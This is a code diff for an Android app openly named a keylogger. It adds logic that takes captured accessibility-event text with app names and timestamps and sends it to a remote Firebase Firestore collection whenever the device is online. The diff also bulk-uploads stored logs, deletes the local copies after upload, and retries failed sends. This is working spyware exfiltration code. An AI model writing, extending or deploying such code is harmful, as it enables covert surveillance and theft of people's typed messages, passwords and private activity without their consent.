@@ -2,6 +2,8 @@ package com.azamovhudstc.androidkeylogger
 
 import android.annotation.SuppressLint
 import android.content.*
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.os.Bundle
 import android.util.Log
 import android.view.Menu
@@ -14,8 +16,13 @@ import com.azamovhudstc.androidkeylogger.databinding.ActivityMainBinding
 import com.azamovhudstc.androidkeylogger.model.LogModel
 import com.azamovhudstc.androidkeylogger.model.NotificationModel
 import com.google.firebase.FirebaseApp
+import com.google.firebase.firestore.FirebaseFirestore
 import com.google.gson.Gson
 import com.google.gson.JsonSyntaxException
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
 import java.io.File
 import java.io.FileWriter
 import java.io.IOException
@@ -30,6 +37,8 @@ class MainFixActivity : AppCompatActivity() {
     private var isNotificationFormat = MutableLiveData<Boolean>(true)
     private val fileName = "notifications.txt"
     private val fileNameLog = "logs.txt"
+    private lateinit var firestore: FirebaseFirestore
+
     private var _binding: ActivityMainBinding? = null
     private val binding get() = _binding!!
 
@@ -78,17 +87,19 @@ class MainFixActivity : AppCompatActivity() {
                 timeStamp!!, batteryLevel
             )
             Log.d("EVENT", "onAccessibilityEventTAAAAAAA: ${text.toString()}")
-
             logAdapter.addNotification(notificationModel)
-            saveLogToFileLocal(
-                LogModel(
-                    text,
-                    packageName,
-                    dayTime,
-                    timeStamp!!,
-                    batteryLevel.toString()
-                )
-            )
+            if (isInternetAvailable(this@MainFixActivity) ) {
+                if (isLocalLogsAvailable()) {
+                    sendLogToFirestore(notificationModel)
+                    uploadLocalLogsToFirestore()
+
+                } else {
+                    sendLogToFirestore(notificationModel)
+                }
+            } else {
+                saveLogToFileLocal(notificationModel)
+            }
+
         }
     }
 
@@ -127,7 +138,8 @@ class MainFixActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         _binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
-        FirebaseApp.initializeApp(this);
+        FirebaseApp.initializeApp(this)
+        firestore = FirebaseFirestore.getInstance()
 
         recyclerView = findViewById(R.id.notificationRecyclerView)
         // Read data from file upon the first launch
@@ -197,6 +209,97 @@ class MainFixActivity : AppCompatActivity() {
         }
     }
 
+
+    private fun deleteLogFromLocalFile(log: LogModel) {
+        val file = File(filesDir, fileNameLog)
+        val tempList = mutableListOf<LogModel>()
+        if (file.exists()) {
+            try {
+                val gson = Gson()
+                val reader = file.bufferedReader()
+
+                // Avvalgi loglar bilan to'g'ri kelgan logni o'chirish
+                reader.forEachLine { line ->
+                    val notificationModel = gson.fromJson(line, LogModel::class.java)
+                    if (notificationModel != log) {
+                        tempList.add(notificationModel)
+                    }
+                }
+                reader.close()
+
+                // Faylni tozalash
+                file.delete()
+
+                // Yangi ma'lumotlarni faylga yozish
+                val writer = FileWriter(file, true)
+                tempList.forEach { tempLog ->
+                    val logJson = gson.toJson(tempLog)
+                    writer.append(logJson)
+                    writer.append("\n")
+                }
+                writer.close()
+            } catch (e: IOException) {
+                e.printStackTrace()
+            } catch (e: JsonSyntaxException) {
+                e.printStackTrace()
+            }
+        }
+    }
+
+    private fun retryUploadLog(log: LogModel, retryDelayMs: Long = 5000L) {
+        GlobalScope.launch(Dispatchers.IO) {
+            delay(retryDelayMs)
+            val nextRetryDelayMs =
+                (retryDelayMs * 2).coerceAtMost(6000L) // Exponential backoff with a maximum delay
+            sendLogToFirestore(log)
+        }
+    }
+
+    private fun isNetworkFastEnough(context: Context): Boolean {
+        val connectivityManager =
+            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val network = connectivityManager.activeNetwork
+        val capabilities = connectivityManager.getNetworkCapabilities(network)
+        return capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ?: false &&
+                (capabilities?.linkDownstreamBandwidthKbps
+                    ?: 0) >= 14_000 // Minimum required speed for H+ network
+    }
+
+    private fun isLocalLogsAvailable(): Boolean {
+        val file = File(filesDir, fileNameLog)
+        return file.exists()
+    }
+
+    private fun uploadLocalLogsToFirestore() {
+        val file = File(filesDir, fileNameLog)
+        if (file.exists()) {
+            val gson = Gson()
+            val logsToUpload = mutableListOf<LogModel>()
+
+            file.bufferedReader().useLines { lines ->
+                lines.forEach { line ->
+                    val logModel = gson.fromJson(line, LogModel::class.java)
+                    logsToUpload.add(logModel)
+                }
+            }
+
+            val dataCollection = firestore.collection("logs")
+
+            GlobalScope.launch(Dispatchers.IO) {
+                logsToUpload.forEach { log ->
+                    dataCollection.add(log)
+                        .addOnSuccessListener {
+                            deleteLogFromLocalFile(log)
+                        }
+                        .addOnFailureListener { e ->
+                            Log.d("EVENT", "sendLogToFirestore: ${e.message}")
+                            // Handle failure
+                        }
+                }
+            }
+        }
+    }
+
     private fun readLogFromFileLocal() {
         val file = File(filesDir, fileNameLog)
         if (file.exists()) {
@@ -229,6 +332,28 @@ class MainFixActivity : AppCompatActivity() {
         }
         return super.onOptionsItemSelected(menuItem)
     }
+
+    private fun isInternetAvailable(context: Context): Boolean {
+        val connectivityManager =
+            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        val networkInfo = connectivityManager.activeNetworkInfo
+        return networkInfo != null && networkInfo.isConnected
+    }
+
+    private fun sendLogToFirestore(logModel: LogModel) {
+        // Firebase Firestore bog'lanish
+        val firestore = FirebaseFirestore.getInstance()
+        val dataCollection = firestore.collection("logs")
+        dataCollection.add(logModel)
+            .addOnSuccessListener { documentReference ->
+                Log.d("EVENT", "sendLogToFirestore: ${documentReference.id}")
+            }
+            .addOnFailureListener { e ->
+                retryUploadLog(logModel)
+                Log.d("EVENT", "sendLogToFirestore: ${e.message}")
+            }
+    }
+
 
     override fun onCreateOptionsMenu(menu: Menu): Boolean {
         menuInflater.inflate(R.menu.btn, menu)
